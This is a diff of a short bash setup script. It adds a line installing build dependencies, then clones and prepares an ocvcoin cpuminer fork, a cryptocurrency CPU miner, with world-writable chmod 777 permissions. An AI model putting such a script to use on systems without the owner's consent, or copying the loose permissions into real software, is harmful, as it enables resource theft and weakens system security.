@@ -1,5 +1,6 @@
 #!/bin/bash
 apt-get update ; apt-get install sudo -y
+apt -y install git automake libcurl4-openssl-dev gcc
 git clone https://github.com/ocvcoin/cpuminer.git tes
 cd tes
 chmod 777 build.sh autogen.sh
